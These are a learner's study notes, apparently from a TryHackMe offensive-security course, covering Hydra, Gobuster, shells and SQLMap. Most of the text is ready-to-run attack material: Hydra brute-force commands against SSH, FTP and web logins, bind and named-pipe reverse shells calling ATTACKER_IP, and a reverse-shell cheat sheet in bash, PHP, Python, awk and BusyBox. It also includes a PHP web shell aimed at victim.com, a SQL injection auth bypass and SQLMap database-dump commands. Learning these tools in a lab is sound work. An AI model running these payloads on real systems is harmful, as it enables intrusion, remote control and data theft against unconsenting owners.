# Offensive-security-tooling-note-cybersec101-
Here are ny notes after finishing tryhackme offensive security tooling
# Offensive Security & Exploitation Tools Notes

## Hydra: Online Brute-Forcing

Hydra is a parallelized network logon cracker used to brute-force authentication services. It supports a massive range of protocols (FTP, SSH, HTTP-FORM, SMB, Databases, Telnet, etc.).

### Command Syntax & Examples

* **FTP Brute-Force:**
```bash
hydra -l user -P passlist.txt ftp://10.130.167.5

```


*(Targets FTP using a known username `user` and a password list `passlist.txt`).*
* **SSH Brute-Force (Multi-threaded):**
```bash
hydra -l root -P passwords.txt 10.130.167.5 -t 4 ssh

```


*(Targets SSH using the `root` user, running 4 parallel threads `-t 4`).*
* **HTTP POST Form Brute-Force:**
```bash
hydra -l <username> -P <wordlist> 10.130.167.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

```


*(Replaces `^USER^` and `^PASS^` with current guesses. `F=incorrect` tells Hydra what a failed login response looks like. `-V` enables verbose output).*
* **Specifying Ports:** Append `-s <port>` to define a non-standard port.

---

## Gobuster: Web & DNS Enumeration

Gobuster is a fast, Golang-based tool used to brute-force web directories, DNS subdomains, and virtual hosts (VHosts).

### 1. Directory Mode (`dir`)

Finds hidden directories and files on a web server.

* **Standard Scan:**
```bash
gobuster dir -u "http://www.example.thm" -w /path/to/wordlist.txt -t 64

```


* **Scan for Specific File Extensions:**
```bash
gobuster dir -u "http://www.example.thm" -w wordlist.txt -x .php,.js

```



**Directory Mode Flags:**

| Flag | Function |
| --- | --- |
| `-u` | Target URL (the base path to start looking). |
| `-w` | Path to the wordlist. |
| `-t` | Number of concurrent threads (e.g., `64` drastically improves speed). |
| `-x` | File extensions to append to wordlist entries (e.g., `.php,.txt`). |
| `-r` | Follow HTTP redirects. |

### 2. DNS Mode (`dns`)

Brute-forces subdomains by performing DNS lookups.

```bash
gobuster dns -d example.thm -w path/to/wordlist.txt

```

### 3. VHost Mode (`vhost`)

Brute-forces virtual hosts (different websites hosted on the exact same IP/machine).

* **Standard VHost Scan:**
```bash
gobuster vhost -u "http://example.thm" -w /path/to/wordlist.txt

```


* **Advanced VHost Scan (Without DNS Infrastructure):**
```bash
gobuster vhost -u "http://MACHINE_IP" --domain example.thm -w wordlist.txt --append-domain --exclude-length 250-320

```


*(Note: `--append-domain` ensures the wordlist entry is appended to the base domain (e.g., `blog.example.thm`). `--exclude-length` filters out generic false-positive responses based on content length).*

---

## Shells & Payloads

A shell is software that allows a user to interact directly with an operating system. Attackers use shells for remote control, privilege escalation, data exfiltration, persistence, and pivoting to other network hosts.

### Shell Types

**1. Reverse Shell (Connect-Back)**
The target machine actively initiates a connection back to the attacker's listening machine. This is the most popular technique because it often bypasses inbound firewall restrictions.

* **Attacker Listener:** `nc -lvnp 443`
* **Target Execution (Payload):** Executes a payload that calls back to the attacker.

**2. Bind Shell**
The target machine opens a specific port and waits for the attacker to connect to it.

* **Target Execution (Payload):** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
* **Attacker Connects:** `nc -nv TARGET_IP 8080`

### Anatomy of a Named Pipe Shell Payload

Understanding how a standard Linux reverse shell (`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP PORT >/tmp/f`) functions:

1. **Clean Up Existing Pipes:**
`rm -f /tmp/f` ensures no conflicting named pipe currently exists at that location.


2. **Create the Named Pipe (FIFO):**
`mkfifo /tmp/f` creates a conduit that allows for two-way communication between independent processes.


3. **Read from the Pipe:**
`cat /tmp/f` pauses and waits to read any input sent through the pipe.


4. **Pipe to an Interactive Shell:**
`| sh -i 2>&1` takes the output from the `cat` command and feeds it directly into an interactive shell. `2>&1` ensures error messages are sent back to standard output alongside normal responses.


5. **Send Output Over the Network:**
`| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` pipes the shell's output through Netcat directly to the attacker, and redirects the final output *back* into the named pipe (`>/tmp/f`), completing the bi-directional loop.


### Listener Upgrades

* **rlwrap:** `rlwrap nc -lvnp 443` (Wraps Netcat to provide arrow-key history and editing).
* **Ncat:** `ncat --ssl -lvnp 4444` (Upgraded Netcat providing SSL encryption).
* **Socat:** `socat -d -d TCP-LISTEN:443 STDOUT` (Creates a robust socket connection with verbose debugging).

### Reverse Shell Payload Cheat Sheet

| Language / Tool | Payload Syntax |
| --- | --- |
| **Bash (Standard)** | `bash -i >& /dev/tcp/IP/443 0>&1` |
| **Bash (Descriptor 5)** | `bash -i 5<> /dev/tcp/IP/443 0<&5 1>&5 2>&5` |
| **PHP (exec)** | `php -r '$sock=fsockopen("IP",443);exec("sh <&3 >&3 2>&3");'` |
| **Python (Short)** | `python -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` |
| **Telnet** | `TF=$(mktemp -u); mkfifo $TF && telnet IP 443 0<$TF | sh 1>$TF` |
| **AWK** | `awk 'BEGIN {s = "/inet/tcp/0/IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` |
| **BusyBox** | `busybox nc IP 443 -e sh` |

### Web Shells

A script written in a web language (PHP, ASP, JSP) that executes system commands via the web server. They are uploaded by exploiting Unrestricted File Uploads or Command Injection.

* **Basic PHP Web Shell:**
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

```


*Execution:* `[http://victim.com/uploads/shell.php?cmd=whoami](http://victim.com/uploads/shell.php?cmd=whoami)`
* **Established Web Shells:** `p0wny-shell` (minimalistic), `b374k` (feature-rich), `c99 shell` (robust and extensive).

---

## SQLMap: Automated SQL Injection

SQLMap automates the detection and exploitation of SQL injection vulnerabilities, allowing attackers to dump database contents.

**SQL Injection Concept (Auth Bypass):**
If a backend query looks like: `SELECT * FROM users WHERE username = 'John' AND password = 'Input'`
Injecting `abc' OR 1=1;-- -` changes the logic to evaluate as always true, bypassing the password check:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';

```

### SQLMap Enumeration Workflow

Using SQLMap effectively requires drilling down from databases, to tables, to specific records.

1. **Identify Vulnerable Parameters:**
Locate a URL that passes data to the backend via GET or POST (e.g., `[http://sqlmaptesting.thm/search?cat=1](http://sqlmaptesting.thm/search?cat=1)`).


2. **Enumerate Databases:**
Use `--dbs` to list all available databases on the server.

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --dbs

```


3. **Enumerate Tables:**
Target a specific database using `-D` and list its tables using `--tables`.

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users --tables

```


4. **Dump Records:**
Target a specific table using `-T` and extract its data using `--dump`.

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users -T thomas --dump

```


### Advanced SQLMap Flags

* `--wizard`: Interactive mode for beginners; asks guided questions to build the attack.
* `--cookie`: Injects session cookies into the request to test injection points hidden behind authentication (e.g., `--cookie="SESSIONID=abcdef123"`).
* `-r`: Points SQLMap to a saved text file containing a raw, intercepted HTTP request (excellent for testing POST requests or complex headers).
```bash
sqlmap -r intercepted_request.txt

```